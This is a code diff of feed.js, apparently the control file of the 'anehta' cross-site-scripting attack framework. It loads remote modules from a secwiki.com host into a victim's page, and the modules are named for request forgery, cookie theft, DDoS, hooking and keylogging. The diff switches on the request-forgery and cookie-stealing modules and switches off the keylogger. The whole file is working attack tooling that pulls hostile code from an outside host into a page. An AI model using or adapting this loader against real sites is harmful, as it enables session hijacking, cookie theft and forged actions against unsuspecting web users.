@@ -1,25 +1,30 @@
 //////////////////////////////////////////////////////////////
 // feed.js 是中心控制文件，在这里插入各种脚本模块
+// Author: axis
 //alert("feed.js 种子");
 var $d=document;
 
+// anehta files url
+var anehtaurl = "http://www.secwiki.com/anehta";
+
 ///////////////////////////////////////////////////////////////////////
 // function library
-var BaseLib = "http://www.secwiki.com/athena/library/base.js";
-var Base64Lib = "http://www.secwiki.com/athena/library/base64.js";
-var AjaxLib = "http://www.secwiki.com/athena/library/ajax.js";
-var UtfLib = "http://www.secwiki.com/athena/library/utf.js";
-var HookLib = "http://www.secwiki.com/athena/library/hooklib.js";
-var JqueryLib = "http://www.secwiki.com/athena/library/jquery.js";
+var BaseLib = anehtaurl+"/library/base.js";
+var Base64Lib = anehtaurl+"/library/base64.js";
+var AjaxLib = anehtaurl+"/library/ajax.js";
+var UtfLib = anehtaurl+"/library/utf.js";
+var HookLib = anehtaurl+"/library/hooklib.js";
+var JqueryLib = anehtaurl+"/library/jquery.js";
 
 ///////////////////////////////////////////////////////////////////////
 // Module
-var BoomerangMod = "http://www.secwiki.com/athena/module/boomerang.js";
-var ClxMod = "http://www.secwiki.com/athena/module/clx.js";
-var XsrfMod = "http://www.secwiki.com/athena/module/xsrf.js";
-var DdosMod = "http://www.secwiki.com/athena/module/ddos.js";
-var HookMod = "http://www.secwiki.com/athena/module/hook.js";
-var KeyloggerMod = "http://www.secwiki.com/athena/module/keylog.js";
+var BoomerangMod = anehtaurl+"/module/boomerang.js";
+var ClxMod = anehtaurl+"/module/clx.js";
+var XsrfMod = anehtaurl+"/module/xsrf.js";
+var DdosMod = anehtaurl+"/module/ddos.js";
+var HookMod = anehtaurl+"/module/hook.js";
+var KeyloggerMod = anehtaurl+"/module/keylog.js";
+var XCookieMod = anehtaurl+"/module/xcookie.js";
 
 ///////////////////////////////////////////////////////////////////////
 
@@ -47,6 +52,7 @@ try {
     
     //InjectScript(ClxMod);
     //InjectScript(XsrfMod);
+    //InjectScript(XCookieMod);
     //InjectScript(BoomerangMod);
     //InjectScript(DdosMod);
     //InjectScript(HookMod);
@@ -57,15 +63,16 @@ try {
     //AddScript(Base64Lib);
     //AddScript(UtfLib);
     //AddScript(AjaxLib);
-    AddScript(HookLib);
+    //AddScript(HookLib);
     AddScript(JqueryLib);
     
     AddScript(ClxMod);
-    //AddScript(XsrfMod);
-    //AddScript(BoomerangMod);
+    AddScript(XsrfMod);
+    AddScript(XCookieMod);
+    //AddScript(BoomerangMod); 可以不用在feed.js里加,xcookie模块会自动判断浏览器并添加
     //AddScript(DdosMod);
     AddScript(HookMod);
-    AddScript(KeyloggerMod);
+    //AddScript(KeyloggerMod);
 }
 catch (e){
     //alert(e);
